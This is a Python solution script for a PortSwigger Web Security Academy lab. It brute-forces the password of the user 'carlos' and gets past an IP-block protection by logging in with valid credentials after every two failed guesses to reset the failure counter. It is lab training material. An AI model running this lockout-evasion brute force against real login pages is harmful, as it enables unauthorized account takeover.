import requests

''' https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block '''

'''
 This lab is vulnerable due to a logic flaw in its password brute-force protection.
 To solve the lab, brute-force the victim's password, then log in and access their account page.
    Your credentials: wiener:peter
    Victim's username: carlos
    Candidate passwords [https://portswigger.net/web-security/authentication/auth-lab-passwords]
'''

# remember to change the url
url = "https://0afa006103f76425802fb2e800ea003e.web-security-academy.net/"
endpoint = "login"


def main():
    """
    The site blocks the IP after 3 failed login attempts.
    But the site resets the failed attempts, when a valid user logs in.
    Therefore:
    1. Login one time with a valid user
    2. Try two times for the target user
    3. Repeat
    """

    assert requests.get(url=url).status_code == 200  # check if the server is up

    found = False

    with open("burp_academy_passwords") as passwords:

        i = -1
        while not found:
            i += 1

            if i % 3 == 0:
                print(".", end="")
                username = "wiener"
                password = "peter"
            else:
                print("?", end="")
                username = "carlos"
                password = passwords.readline().strip()

            data = {"username": username, "password": password}
            login = requests.post(url=url + endpoint, data=data, allow_redirects=False)

            if username != "wiener" and "Incorrect password" not in login.text:
                print("!")
                print(username, password)
                found = True


if __name__ == '__main__':
    main()
